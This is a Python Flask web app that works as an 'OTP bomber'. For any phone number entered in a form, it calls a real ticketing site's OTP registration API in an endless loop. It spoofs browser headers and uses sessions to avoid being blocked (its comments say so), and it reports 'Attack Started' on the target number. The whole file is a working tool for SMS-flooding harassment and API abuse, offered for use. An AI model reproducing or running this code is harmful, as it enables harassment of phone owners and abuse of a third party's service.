import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# OTP Sending Logic
API_URL = "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={}"
DELAY = 20 # Delay thoda badha diya hai taaki block na ho

active_tasks = {}

def send_otp_loop(mobile):
    count = 1
    # Improved Headers (Browser jaisa dikhne ke liye)
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Host": "securedapi.confirmtkt.com",
        "Origin": "https://www.confirmtkt.com",
        "Referer": "https://www.confirmtkt.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
    }
    
    # Session use karne se cookies manage hoti hain, jo real lagta hai
    session = requests.Session()
    
    while active_tasks.get(mobile):
        try:
            formatted_url = API_URL.format(mobile)
            response = session.get(formatted_url, headers=headers, timeout=15)
            
            # Log mein status code aur response print hoga
            print(f"[{mobile}] Attempt #{count} - Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"SUCCESS: OTP Sent to {mobile}")
            elif response.status_code == 403:
                print("FAILED: API ne block kar diya (403 Forbidden).")
            
        except Exception as e:
            print(f"Error: {e}")
        
        count += 1
        time.sleep(DELAY)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        thread = threading.Thread(target=send_otp_loop, args=(mobile,))
        thread.daemon = True
        thread.start()
        return jsonify({"status": "success", "message": f"Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
